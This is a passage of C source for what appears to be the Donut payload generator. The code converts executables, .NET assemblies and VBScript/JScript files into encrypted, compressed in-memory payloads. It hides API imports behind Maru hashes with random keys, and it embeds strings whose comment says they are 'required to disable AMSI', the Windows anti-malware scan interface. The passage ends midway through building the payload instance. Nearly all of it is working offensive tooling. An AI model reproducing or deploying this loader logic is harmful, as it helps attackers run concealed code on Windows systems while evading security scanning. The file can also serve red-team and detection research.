/**
  BSD 3-Clause License

  Copyright (c) 2019, TheWover, Odzhan. All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are met:

  * Redistributions of source code must retain the above copyright notice, this
    list of conditions and the following disclaimer.

  * Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

  * Neither the name of the copyright holder nor the names of its
    contributors may be used to endorse or promote products derived from
    this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#include "donut.h"

#include "loader/loader_exe_x86.h"
#include "loader/loader_exe_x64.h"
  
#define PUT_BYTE(p, v)     { *(uint8_t *)(p) = (uint8_t) (v); p = (uint8_t*)p + 1; }
#define PUT_HWORD(p, v)    { t=v; memcpy((char*)p, (char*)&t, 2); p = (uint8_t*)p + 2; }
#define PUT_WORD(p, v)     { t=v; memcpy((char*)p, (char*)&t, 4); p = (uint8_t*)p + 4; }
#define PUT_BYTES(p, v, n) { memcpy(p, v, n); p = (uint8_t*)p + n; }
 
// required for each API used by the loader
#define DLL_NAMES "ole32;oleaut32;wininet;mscoree;shell32;dnsapi"
 
// These must be in the same order as the DONUT_INSTANCE structure defined in donut.h
static API_IMPORT api_imports[]=
{ 
  {KERNEL32_DLL, "LoadLibraryA"},
  {KERNEL32_DLL, "GetProcAddress"},
  {KERNEL32_DLL, "GetModuleHandleA"},
  {KERNEL32_DLL, "VirtualAlloc"},
  {KERNEL32_DLL, "VirtualFree"},
  {KERNEL32_DLL, "VirtualQuery"},
  {KERNEL32_DLL, "VirtualProtect"},
  {KERNEL32_DLL, "Sleep"},
  {KERNEL32_DLL, "MultiByteToWideChar"},
  {KERNEL32_DLL, "GetUserDefaultLCID"},
  {KERNEL32_DLL, "WaitForSingleObject"},
  {KERNEL32_DLL, "CreateThread"},
  {KERNEL32_DLL, "GetThreadContext"},
  {KERNEL32_DLL, "GetCurrentThread"},
      
  {SHELL32_DLL,  "CommandLineToArgvW"},
  
  {OLEAUT32_DLL, "SafeArrayCreate"},
  {OLEAUT32_DLL, "SafeArrayCreateVector"},
  {OLEAUT32_DLL, "SafeArrayPutElement"},
  {OLEAUT32_DLL, "SafeArrayDestroy"},
  {OLEAUT32_DLL, "SafeArrayGetLBound"},
  {OLEAUT32_DLL, "SafeArrayGetUBound"},
  {OLEAUT32_DLL, "SysAllocString"},
  {OLEAUT32_DLL, "SysFreeString"},
  {OLEAUT32_DLL, "LoadTypeLib"},
  
  {WININET_DLL,  "InternetCrackUrlA"},
  {WININET_DLL,  "InternetOpenA"},
  {WININET_DLL,  "InternetConnectA"},
  {WININET_DLL,  "InternetSetOptionA"},
  {WININET_DLL,  "InternetReadFile"},
  {WININET_DLL,  "InternetCloseHandle"},
  {WININET_DLL,  "HttpOpenRequestA"},
  {WININET_DLL,  "HttpSendRequestA"},
  {WININET_DLL,  "HttpQueryInfoA"},
  
  {MSCOREE_DLL,  "CorBindToRuntime"},
  {MSCOREE_DLL,  "CLRCreateInstance"},
  
  {OLE32_DLL,    "CoInitializeEx"},
  {OLE32_DLL,    "CoCreateInstance"},
  {OLE32_DLL,    "CoUninitialize"},

  {NTDLL_DLL,    "RtlEqualUnicodeString"},
  {NTDLL_DLL,    "RtlEqualString"},
  {NTDLL_DLL,    "RtlUnicodeStringToAnsiString"},
  {NTDLL_DLL,    "RtlInitUnicodeString"},
  {NTDLL_DLL,    "RtlExitUserThread"},
  {NTDLL_DLL,    "RtlExitUserProcess"},
  {NTDLL_DLL,    "RtlCreateUnicodeString"},
  {NTDLL_DLL,    "RtlGetCompressionWorkSpaceSize"},
  {NTDLL_DLL,    "RtlDecompressBufferEx"},
  {NTDLL_DLL,    "NtContinue"},
  //{NTDLL_DLL,    "RtlFreeUnicodeString"},
  //{NTDLL_DLL,    "RtlFreeString"},
  
  { NULL, NULL }   // last one always contains two NULL pointers
};

// required to load .NET assemblies
static GUID xCLSID_CorRuntimeHost = {
  0xcb2f6723, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}};

static GUID xIID_ICorRuntimeHost = {
  0xcb2f6722, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}};

static GUID xCLSID_CLRMetaHost = {
  0x9280188d, 0xe8e, 0x4867, {0xb3, 0xc, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde}};
  
static GUID xIID_ICLRMetaHost = {
  0xD332DB9E, 0xB9B3, 0x4125, {0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16}};
  
static GUID xIID_ICLRRuntimeInfo = {
  0xBD39D1D2, 0xBA2F, 0x486a, {0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91}};

static GUID xIID_AppDomain = {
  0x05F696DC, 0x2B29, 0x3663, {0xAD, 0x8B, 0xC4,0x38, 0x9C, 0xF2, 0xA7, 0x13}};
  
// required to load VBS and JS files
static GUID xIID_IUnknown = {
  0x00000000, 0x0000, 0x0000, {0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}};

static GUID xIID_IDispatch = {
  0x00020400, 0x0000, 0x0000, {0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}};

static GUID xIID_IHost  = { 
  0x91afbd1b, 0x5feb, 0x43f5, {0xb0, 0x28, 0xe2, 0xca, 0x96, 0x06, 0x17, 0xec}};
  
static GUID xIID_IActiveScript = {
  0xbb1a2ae1, 0xa4f9, 0x11cf, {0x8f, 0x20, 0x00, 0x80, 0x5f, 0x2c, 0xd0, 0x64}};

static GUID xIID_IActiveScriptSite = {
  0xdb01a1e3, 0xa42b, 0x11cf, {0x8f, 0x20, 0x00, 0x80, 0x5f, 0x2c, 0xd0, 0x64}};

static GUID xIID_IActiveScriptSiteWindow = {
  0xd10f6761, 0x83e9, 0x11cf, {0x8f, 0x20, 0x00, 0x80, 0x5f, 0x2c, 0xd0, 0x64}};
  
static GUID xIID_IActiveScriptParse32 = {
  0xbb1a2ae2, 0xa4f9, 0x11cf, {0x8f, 0x20, 0x00, 0x80, 0x5f, 0x2c, 0xd0, 0x64}};

static GUID xIID_IActiveScriptParse64 = {
  0xc7ef7658, 0xe1ee, 0x480e, {0x97, 0xea, 0xd5, 0x2c, 0xb4, 0xd7, 0x6d, 0x17}};

static GUID xCLSID_VBScript = {
  0xB54F3741, 0x5B07, 0x11cf, {0xA4, 0xB0, 0x00, 0xAA, 0x00, 0x4A, 0x55, 0xE8}};

static GUID xCLSID_JScript  = {
  0xF414C260, 0x6AC0, 0x11CF, {0xB6, 0xD1, 0x00, 0xAA, 0x00, 0xBB, 0xBB, 0x58}};

#if defined(_WIN32) | defined(_WIN64)
#include "include/mmap-windows.c"
#ifdef _MSC_VER
#define strcasecmp stricmp
#endif
#endif

// return pointer to DOS header
static PIMAGE_DOS_HEADER DosHdr(void *map) {
    return (PIMAGE_DOS_HEADER)map;
}

// return pointer to NT headers
static PIMAGE_NT_HEADERS NtHdr (void *map) {
    return (PIMAGE_NT_HEADERS) ((uint8_t*)map + DosHdr(map)->e_lfanew);
}

// return pointer to File header
static PIMAGE_FILE_HEADER FileHdr (void *map) {
    return &NtHdr(map)->FileHeader;
}

// determines CPU architecture of binary
static int is32 (void *map) {
    return FileHdr(map)->Machine == IMAGE_FILE_MACHINE_I386;
}

// return pointer to Optional header
static void* OptHdr (void *map) {
    return (void*)&NtHdr(map)->OptionalHeader;
}

static PIMAGE_DATA_DIRECTORY Dirs (void *map) {
    if (is32(map)) {
      return ((PIMAGE_OPTIONAL_HEADER32)OptHdr(map))->DataDirectory;
    } else {
      return ((PIMAGE_OPTIONAL_HEADER64)OptHdr(map))->DataDirectory;
    }
}

// valid dos header?
static int valid_dos_hdr (void *map) {
    PIMAGE_DOS_HEADER dos = DosHdr(map);
    
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    return (dos->e_lfanew != 0);
}

// valid nt headers
static int valid_nt_hdr (void *map) {
    return NtHdr(map)->Signature == IMAGE_NT_SIGNATURE;
}

static ULONG64 rva2ofs (void *base, ULONG64 rva) {
    DWORD                 i;
    ULONG64               ofs;
    PIMAGE_DOS_HEADER     dos;
    PIMAGE_NT_HEADERS     nt;
    PIMAGE_SECTION_HEADER sh;
      
    dos = (PIMAGE_DOS_HEADER)base;
    nt  = (PIMAGE_NT_HEADERS)((PBYTE)base + dos->e_lfanew);
    sh  = (PIMAGE_SECTION_HEADER)
      ((PBYTE)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);
    
    for (i=0; i<nt->FileHeader.NumberOfSections; i++) {      
      if ((rva >= sh[i].VirtualAddress) && 
          (rva < (sh[i].VirtualAddress + sh[i].SizeOfRawData))) {
          
        ofs = sh[i].PointerToRawData + (rva - sh[i].VirtualAddress);
        return ofs;
      }
    }
    return -1;
}

// map a file into memory for reading
static int map_file(const char *path, file_info *fi) {
    struct stat fs;

    DPRINT("Reading size of file : %s", path);
    if(stat(path, &fs) != 0) {
      return DONUT_ERROR_FILE_NOT_FOUND;
    }
    
    if(fs.st_size == 0) {
      return DONUT_ERROR_FILE_EMPTY;
    }
      
    DPRINT("Opening %s", path);
    fi->fd = open(path, O_RDONLY);
    
    if(fi->fd < 0) {
      return DONUT_ERROR_FILE_ACCESS;
    }
    
    fi->len = fs.st_size;
    
    // map into memory
    DPRINT("Mapping %" PRIi32 " bytes for %s", fi->len, path);
    fi->data = mmap(NULL, fi->len,  
      PROT_READ, MAP_PRIVATE, fi->fd, 0);
    
    // no mapping? close file
    if(fi->data == NULL) {
      close(fi->fd);
      fi->data = NULL;
      return DONUT_ERROR_NO_MEMORY;
    }
    return DONUT_ERROR_SUCCESS;
}

// unmap a file from memory previously opened with map_file()
static int unmap_file(file_info *fi) {
    
    if(fi == NULL) return 0;
    
    if(fi->zdata != NULL) {
      DPRINT("Releasing compressed data");
      free(fi->zdata);
      fi->zdata = NULL;
    }
    DPRINT("Unmapping");
    munmap(fi->data, fi->len);    
    
    DPRINT("Closing");
    close(fi->fd);
    
    return 1;
}

#if defined(DONUT_EXE) || defined(DEBUG)
static uint32_t file_diff(uint32_t new_len, uint32_t old_len) {
    if (new_len <= UINT_MAX / 100) {
      new_len *= 100;
    } else {
      old_len /= 100;
    }
    if (old_len == 0) {
      old_len = 1;
    }
    return (100 - (new_len / old_len));
}
#endif

static int get_file_info(PDONUT_CONFIG c, file_info *fi) {
    PIMAGE_NT_HEADERS                nt;    
    PIMAGE_DATA_DIRECTORY            dir;
    PMDSTORAGESIGNATURE              pss;
    PIMAGE_COR20_HEADER              cor;
    DWORD                            dll, rva, cpu;
    ULONG64                          ofs;
    PCHAR                            ext;
    int                              err = DONUT_ERROR_SUCCESS;

    DPRINT("Entering.");
    
    // invalid parameters passed?
    if(fi == NULL || c->input[0] == 0) {
      return DONUT_ERROR_INVALID_PARAMETER;
    }
    // zero initialize file_info structure
    memset(fi, 0, sizeof(file_info));
    
    DPRINT("Checking extension of %s", c->input);
    ext = strrchr(c->input, '.');
    
    // no extension? exit
    if(ext == NULL) {
      return DONUT_ERROR_FILE_INVALID;
    }
    DPRINT("Extension is \"%s\"", ext);

    // VBScript?
    if (strcasecmp(ext, ".vbs") == 0) {
      DPRINT("Module is VBS");
      fi->type = DONUT_MODULE_VBS;
      fi->arch = DONUT_ARCH_ANY;
    } else 
    // JScript?
    if (strcasecmp(ext,  ".js") == 0) {
      DPRINT("Module is JS");
      fi->type = DONUT_MODULE_JS;
      fi->arch = DONUT_ARCH_ANY;
    } else 
    // EXE?
    if (strcasecmp(ext, ".exe") == 0) {
      DPRINT("Module is EXE");
      fi->type = DONUT_MODULE_EXE;
    } else
    // DLL?
    if (strcasecmp(ext, ".dll") == 0) {
      DPRINT("Module is DLL");
      fi->type = DONUT_MODULE_DLL;
    } else {
      // unrecognized extension
      return DONUT_ERROR_FILE_INVALID;
    }
    
    DPRINT("Mapping %s into memory", c->input);
    
    err = map_file(c->input, fi);
    if(err != DONUT_ERROR_SUCCESS) return err;
    
    // file is EXE or DLL?
    if(fi->type == DONUT_MODULE_DLL ||
       fi->type == DONUT_MODULE_EXE)
    {
      DPRINT("Checking DOS header");
      
      if(!valid_dos_hdr(fi->data)) {
        err = DONUT_ERROR_FILE_INVALID;
        goto cleanup;
      }
      DPRINT("Checking NT header");
      
      if(!valid_nt_hdr(fi->data)) { 
        err = DONUT_ERROR_FILE_INVALID;
        goto cleanup;
      }
      DPRINT("Checking IMAGE_DATA_DIRECTORY");
      
      dir = Dirs(fi->data);
      
      if(dir == NULL) {
        err = DONUT_ERROR_FILE_INVALID;
        goto cleanup;
      }
      DPRINT("Checking characteristics");
      
      nt  = NtHdr(fi->data);
      dll = nt->FileHeader.Characteristics & IMAGE_FILE_DLL;
      cpu = is32(fi->data);
      rva = dir[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress;
      
      // set the CPU architecture for file
      fi->arch = cpu ? DONUT_ARCH_X86 : DONUT_ARCH_X64;
      
      // if COM directory present
      if(rva != 0) {
        DPRINT("COM Directory found");
        
        // set type to EXE or DLL assembly
        fi->type = (dll) ? DONUT_MODULE_NET_DLL : DONUT_MODULE_NET_EXE;
        
        // try read the runtime version from meta header
        strncpy(fi->ver, "v4.0.30319", DONUT_VER_LEN - 1);
        
        ofs = rva2ofs(fi->data, rva);
        if (ofs != -1) {
          cor = (PIMAGE_COR20_HEADER)(ofs + fi->data);
          rva = cor->MetaData.VirtualAddress;
          if(rva != 0) {
            ofs = rva2ofs(fi->data, rva);
            if(ofs != -1) {
              pss = (PMDSTORAGESIGNATURE)(ofs + fi->data);
              DPRINT("Runtime version : %s", (char*)pss->pVersion);
              strncpy(fi->ver, (char*)pss->pVersion, DONUT_VER_LEN - 1);
            }
          }
        }
      } else {
        // we need relocation information for unmanaged EXE / DLL
        rva = dir[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
        if(rva == 0) {
          err = DONUT_ERROR_NORELOC;
          goto cleanup;
        }
      }
    }
    #ifdef WINDOWS
      typedef NTSTATUS (WINAPI *RtlGetCompressionWorkSpaceSize_t)(
        USHORT                 CompressionFormatAndEngine,
        PULONG                 CompressBufferWorkSpaceSize,
        PULONG                 CompressFragmentWorkSpaceSize);

      typedef NTSTATUS (WINAPI *RtlCompressBuffer_t)(
        USHORT                 CompressionFormatAndEngine,
        PUCHAR                 UncompressedBuffer,
        ULONG                  UncompressedBufferSize,
        PUCHAR                 CompressedBuffer,
        ULONG                  CompressedBufferSize,
        ULONG                  UncompressedChunkSize,
        PULONG                 FinalCompressedSize,
        PVOID                  WorkSpace);
      
      ULONG                            wspace, fspace;
      NTSTATUS                         nts;
      PVOID                            ws;
      HMODULE                          m;
      RtlGetCompressionWorkSpaceSize_t RtlGetCompressionWorkSpaceSize;
      RtlCompressBuffer_t              RtlCompressBuffer;
      
      // compress file using RtlCompressBuffer?
      if(c->compress == DONUT_COMPRESS_LZNT1  ||
         c->compress == DONUT_COMPRESS_XPRESS ||
         c->compress == DONUT_COMPRESS_XPRESS_HUFF) 
      {
        m = GetModuleHandle("ntdll");
        RtlGetCompressionWorkSpaceSize = (RtlGetCompressionWorkSpaceSize_t)GetProcAddress(m, "RtlGetCompressionWorkSpaceSize");
        RtlCompressBuffer              = (RtlCompressBuffer_t)GetProcAddress(m, "RtlCompressBuffer");
        
        if(RtlGetCompressionWorkSpaceSize == NULL || RtlCompressBuffer == NULL) {
          DPRINT("Unable to resolve compression API");
          err = DONUT_ERROR_COMPRESSION;
          goto cleanup;
        }
        
        DPRINT("Reading fragment and workspace size");
        nts = RtlGetCompressionWorkSpaceSize(
          (c->compress - 1) | COMPRESSION_ENGINE_MAXIMUM, 
          &wspace, &fspace);
          
        if(nts == 0) {
          DPRINT("workspace size : %"PRId32" | fragment size : %"PRId32, wspace, fspace);
          ws = malloc(wspace); 
          if(ws != NULL) {
            DPRINT("Allocating memory for compressed file");
            fi->zdata = malloc(fi->len);
            if(fi->zdata != NULL) {
              DPRINT("Compressing with RtlCompressBuffer(%s)",
                c->compress == DONUT_COMPRESS_LZNT1 ? "LZNT" : 
                c->compress == DONUT_COMPRESS_XPRESS ? "XPRESS" : "XPRESS HUFFMAN");
              
              nts = RtlCompressBuffer(
                (c->compress - 1) | COMPRESSION_ENGINE_MAXIMUM, 
                fi->data, fi->len, fi->zdata, fi->len, 0, 
                (PULONG)&fi->zlen, ws); 
              
              c->zlen = fi->zlen;
              c->len  = fi->len;
              
              if(nts != 0) err = DONUT_ERROR_COMPRESSION;
            } else err = DONUT_ERROR_NO_MEMORY;
            free(ws);
            goto show_stats;
          } else err = DONUT_ERROR_NO_MEMORY;
        } else err = DONUT_ERROR_COMPRESSION;
      }
    #endif
    if(c->compress == DONUT_COMPRESS_APLIB) {
      fi->zdata = malloc(aP_max_packed_size(fi->len));
      if(fi->zdata != NULL) {
        uint8_t *workmem = malloc(aP_workmem_size(fi->len));
        if(workmem != NULL) {
          DPRINT("Compressing with aPLib");
          c->len  = fi->len;
          c->zlen = fi->zlen = aP_pack(fi->data, fi->zdata, fi->len, workmem, NULL, NULL);
        
          if(fi->zlen == APLIB_ERROR) err = DONUT_ERROR_COMPRESSION;
          free(workmem);
        } else err = DONUT_ERROR_NO_MEMORY;
      } else err = DONUT_ERROR_NO_MEMORY;
    }
    
#ifdef WINDOWS
show_stats:
#endif
    // if compression was specified
    if(c->compress != DONUT_COMPRESS_NONE) {
      DPRINT("Original file size : %"PRId32 " | Compressed : %"PRId32, 
        fi->len, fi->zlen);
      
      DPRINT("File size reduced by %"PRId32"%%", file_diff(fi->zlen, fi->len));
    }
cleanup:
    if(err != DONUT_ERROR_SUCCESS) {
      unmap_file(fi);
    }
    DPRINT("Leaving.");
    return err;
}

// check if DLL exports function name
static int is_dll_export(file_info *fi, const char *function) {
    PIMAGE_DATA_DIRECTORY   dir;
    PIMAGE_EXPORT_DIRECTORY exp;
    DWORD                   rva, cnt;
    ULONG64                 ofs;
    PDWORD                  sym;
    PCHAR                   str;
    int                     found = 0;

    DPRINT("Entering.");
    
    dir = Dirs(fi->data);
    if(dir != NULL) {
      rva = dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
      DPRINT("EAT VA : %lx", rva);
      if(rva != 0) {
        ofs = rva2ofs(fi->data, rva);
        DPRINT("Offset = %" PRIX64 "\n", ofs);
        if(ofs != -1) {
          exp = (PIMAGE_EXPORT_DIRECTORY)(fi->data + ofs);
          cnt = exp->NumberOfNames;
          DPRINT("Number of exported functions : %lx", cnt);
          
          if(cnt != 0) {
            sym = (PDWORD)(rva2ofs(fi->data, exp->AddressOfNames) + fi->data);
            // scan array for symbol
            do {
              str = (PCHAR)(rva2ofs(fi->data, sym[cnt - 1]) + fi->data);
              // if match found, exit
              if(strcmp(str, function) == 0) {
                DPRINT("Found API");
                found = 1;
                break;
              }
            } while (--cnt);
          }
        }
      }
    }
    DPRINT("Leaving.");
    return found;
}

// returns 1 on success else <=0
static int CreateRandom(void *buf, uint64_t len) {
#if defined(WINDOWS)
    HCRYPTPROV prov;
    int        ok;
    
    // 1. acquire crypto context
    if(!CryptAcquireContext(
        &prov, NULL, NULL,
        PROV_RSA_AES,
        CRYPT_VERIFYCONTEXT | CRYPT_SILENT)) return 0;

    ok = (int)CryptGenRandom(prov, (DWORD)len, buf);
    CryptReleaseContext(prov, 0);
    
    return ok;
#else
    int      fd;
    uint64_t r=0;
    uint8_t  *p=(uint8_t*)buf;
    
    DPRINT("Opening /dev/urandom to acquire %li bytes", len);
    fd = open("/dev/urandom", O_RDONLY);
    
    if(fd > 0) {
      for(r=0; r<len; r++, p++) {
        if(read(fd, p, 1) != 1) break;
      }
      close(fd);
    }
    DPRINT("Acquired %li of %li bytes requested", r, len);
    return r == len;
#endif
}

// Generate a random string, not exceeding DONUT_MAX_NAME bytes
// tbl is from https://stackoverflow.com/a/27459196
static int GenRandomString(void *output, uint64_t len) {
    uint8_t rnd[DONUT_MAX_NAME];
    int     i;
    char    tbl[]="HMN34P67R9TWCXYF"; 
    char    *str = (char*)output;
    
    if(len == 0 || len > (DONUT_MAX_NAME - 1)) return 0;
    
    // generate DONUT_MAX_NAME random bytes
    if(!CreateRandom(rnd, DONUT_MAX_NAME)) return 0;
    
    // generate a string using unambiguous characters
    for(i=0; i<len; i++) {
      str[i] = tbl[rnd[i] % (sizeof(tbl) - 1)];
    }
    str[i] = 0;
    return 1;
}

static int CreateModule(PDONUT_CONFIG c, file_info *fi) {
    PDONUT_MODULE mod     = NULL;
    uint32_t      mod_len = 0, data_len;
    void          *data   = NULL;
    int           err     = DONUT_ERROR_SUCCESS;
    
    DPRINT("Entering.");
    
    // Allocate memory for module information and contents of file
    data     = (c->compress == DONUT_COMPRESS_NONE) ? fi->data : fi->zdata;
    data_len = (c->compress == DONUT_COMPRESS_NONE) ? fi->len  : fi->zlen;
    mod_len  = data_len + sizeof(DONUT_MODULE);
    
    DPRINT("Allocating %" PRIi32 " bytes of memory for DONUT_MODULE", mod_len);
    mod = calloc(mod_len, 1);

    // Memory not allocated? exit
    if(mod == NULL) {
      DPRINT("calloc() failed");
      return DONUT_ERROR_NO_MEMORY;
    }
    
    // Set the type of module
    mod->type     = fi->type;
    mod->thread   = c->thread;
    mod->unicode  = c->unicode;
    mod->compress = c->compress;
    
    // DotNet assembly?
    if(mod->type == DONUT_MODULE_NET_DLL ||
       mod->type == DONUT_MODULE_NET_EXE)
    {
      // If no domain name specified
      if(c->domain[0] == 0) {
        // If entropy enabled
        if(c->entropy != DONUT_ENTROPY_NONE) {
          // Generate random name
          if(!GenRandomString(c->domain, DONUT_DOMAIN_LEN)) {
            err = DONUT_ERROR_RANDOM;
            goto cleanup;
          }
        } else {
          // set to "AAAAAAAA"
          memset(c->domain, 'A', DONUT_DOMAIN_LEN);
        }
      }
      // Set the domain name to use
      DPRINT("Domain  : %s", c->domain);
      strncpy(mod->domain, c->domain, DONUT_DOMAIN_LEN);
      
      // Assembly is DLL? Copy the class and method
      if(mod->type == DONUT_MODULE_NET_DLL) {
        DPRINT("Class   : %s", c->cls);
        strncpy(mod->cls, c->cls, DONUT_MAX_NAME-1);
        
        DPRINT("Method  : %s", c->method);
        strncpy(mod->method, c->method, DONUT_MAX_NAME-1);
      }
      // If no runtime specified in configuration, use version from assembly
      if(c->runtime[0] == 0) {
        strncpy(c->runtime, fi->ver, DONUT_MAX_NAME-1);
      }
      DPRINT("Runtime : %s", c->runtime);
      strncpy(mod->runtime, c->runtime, DONUT_MAX_NAME-1);
    } else
    // Unmanaged DLL? check for exported api          
    if(mod->type == DONUT_MODULE_DLL && c->method[0] != 0) {
      DPRINT("DLL function : %s", c->method);
      strncpy(mod->method, c->method, DONUT_MAX_NAME-1);
    }
      
    // Parameters specified?
    if(c->param[0] != 0) {
      // if type is unmanaged EXE
      if(mod->type == DONUT_MODULE_EXE) {
        // and entropy is enabled
        if(c->entropy != DONUT_ENTROPY_NONE) {
          // generate 4-byte random name
          GenRandomString(mod->param, 4);
          mod->param[4] = ' ';
        } else {
          // else set to "AAAA "
          memset(mod->param, 'A', 4);
          mod->param[4] = ' ';
        }
      }
      strncat(mod->param, c->param, DONUT_MAX_NAME-6);
    }
    
    DPRINT("Setting the length of module data");
    
    mod->len  = fi->len;
    mod->zlen = fi->zlen;
    DPRINT("Copying data");
    
    memcpy(&mod->data, data, data_len);
    // update configuration with pointer to module
    c->mod     = mod;
    c->mod_len = mod_len;
cleanup:
    // if there was an error, free memory for module
    if(err != DONUT_ERROR_SUCCESS && mod != NULL) {
      free(mod);
      c->mod     = NULL;
      c->mod_len = 0;
    }
    DPRINT("Leaving.");
    return err;
}

static int CreateInstance(PDONUT_CONFIG c, file_info *fi) {
    DONUT_CRYPT     inst_key, mod_key;
    PDONUT_INSTANCE inst = NULL;
    int             inst_len = 0;
    uint64_t        dll_hash = 0;
    int             cnt = 0;
    
    DPRINT("Entering.");
    
    // Allocate memory for the size of instance based on the type
    DPRINT("Allocating space for instance");
    inst_len = sizeof(DONUT_INSTANCE);
    
    // if the module is embedded, add the size of module
    // that will be appended to the end of structure
    if(c->inst_type == DONUT_INSTANCE_EMBED) {
      DPRINT("The size of module is %" PRIi32 " bytes. " 
             "Adding to size of instance.", c->mod_len);
      inst_len += c->mod_len;
    }
    DPRINT("Total length of instance : %"PRIi32, inst_len);
    
    // allocate zero-initialized memory for instance
    inst = (PDONUT_INSTANCE)calloc(inst_len, 1);

    // Memory allocation failed? exit
    if(inst == NULL) {
      DPRINT("Memory allocation failed");
      return DONUT_ERROR_NO_MEMORY;
    }
    
    if(c->entropy == DONUT_ENTROPY_DEFAULT) {
      DPRINT("Generating random key for instance");
      if(!CreateRandom(&inst_key, sizeof(DONUT_CRYPT))) {
        return DONUT_ERROR_RANDOM;
      }
      memcpy(&inst->key, &inst_key, sizeof(DONUT_CRYPT));
      
      DPRINT("Generating random key for module");
      if(!CreateRandom(&mod_key, sizeof(DONUT_CRYPT))) {
        return DONUT_ERROR_RANDOM;
      }
      memcpy(&inst->mod_key, &mod_key, sizeof(DONUT_CRYPT));
      
      DPRINT("Generating random string to verify decryption");
      if(!GenRandomString(inst->sig, DONUT_SIG_LEN)) {
        return DONUT_ERROR_RANDOM;
      }
     
      DPRINT("Generating random IV for Maru hash");
      if(!CreateRandom(&inst->iv, MARU_IV_LEN)) {
        return DONUT_ERROR_RANDOM;
      }
    }

    DPRINT("Generating hashes for API using IV: %" PRIX64, inst->iv);
    
    for(cnt=0; api_imports[cnt].module != NULL; cnt++) {
      // calculate hash for DLL string
      dll_hash = maru(api_imports[cnt].module, inst->iv);
      
      // calculate hash for API string.
      // xor with DLL hash and store in instance
      inst->api.hash[cnt] = maru(api_imports[cnt].name, inst->iv) ^ dll_hash;
      
      DPRINT("Hash for %-15s : %-22s = %016" PRIX64, 
        api_imports[cnt].module, 
        api_imports[cnt].name,
        inst->api.hash[cnt]);
    }
    // save how many API to resolve
    inst->api_cnt = cnt;
    
    //  Each DLL required by the loader API is separated by semi-colon
    strcpy(inst->dll_names, DLL_NAMES);
        
    // if module is .NET assembly
    if(c->mod_type == DONUT_MODULE_NET_DLL ||
       c->mod_type == DONUT_MODULE_NET_EXE)
    {
      DPRINT("Copying GUID structures and DLL strings for loading .NET assemblies");

      memcpy(&inst->xIID_AppDomain,        &xIID_AppDomain,        sizeof(GUID));
      memcpy(&inst->xIID_ICLRMetaHost,     &xIID_ICLRMetaHost,     sizeof(GUID));
      memcpy(&inst->xCLSID_CLRMetaHost,    &xCLSID_CLRMetaHost,    sizeof(GUID));
      memcpy(&inst->xIID_ICLRRuntimeInfo,  &xIID_ICLRRuntimeInfo,  sizeof(GUID));
      memcpy(&inst->xIID_ICorRuntimeHost,  &xIID_ICorRuntimeHost,  sizeof(GUID));
      memcpy(&inst->xCLSID_CorRuntimeHost, &xCLSID_CorRuntimeHost, sizeof(GUID));
    } else 
    // if module is VBS or JS
    if(c->mod_type == DONUT_MODULE_VBS ||
       c->mod_type == DONUT_MODULE_JS)
    {       
      DPRINT("Copying GUID structures and DLL strings for loading VBS/JS");
      
      memcpy(&inst->xIID_IUnknown,                &xIID_IUnknown,                sizeof(GUID));
      memcpy(&inst->xIID_IDispatch,               &xIID_IDispatch,               sizeof(GUID));
      memcpy(&inst->xIID_IHost,                   &xIID_IHost,                   sizeof(GUID));
      memcpy(&inst->xIID_IActiveScript,           &xIID_IActiveScript,           sizeof(GUID));
      memcpy(&inst->xIID_IActiveScriptSite,       &xIID_IActiveScriptSite,       sizeof(GUID));
      memcpy(&inst->xIID_IActiveScriptSiteWindow, &xIID_IActiveScriptSiteWindow, sizeof(GUID));
      memcpy(&inst->xIID_IActiveScriptParse32,    &xIID_IActiveScriptParse32,    sizeof(GUID));
      memcpy(&inst->xIID_IActiveScriptParse64,    &xIID_IActiveScriptParse64,    sizeof(GUID));
      
      strcpy(inst->wscript,     "WScript");
      strcpy(inst->wscript_exe, "wscript.exe");
      
      if(c->mod_type == DONUT_MODULE_VBS) {
        memcpy(&inst->xCLSID_ScriptLanguage,    &xCLSID_VBScript, sizeof(GUID));
      } else {
        memcpy(&inst->xCLSID_ScriptLanguage,    &xCLSID_JScript,  sizeof(GUID));
      }
    }

    // required to disable AMSI
    strcpy(inst->clr,            "clr");
    strcpy(inst->amsi,           "amsi");
    strcpy(inst->amsiInit,       "AmsiInitialize");
    strcpy(inst->amsiScanBuf,    "AmsiScanBuffer");
    strcpy(inst->amsiScanStr,    "AmsiScanString");
    
    // stuff for PE loader
    strcpy(inst->dataname,       ".data");
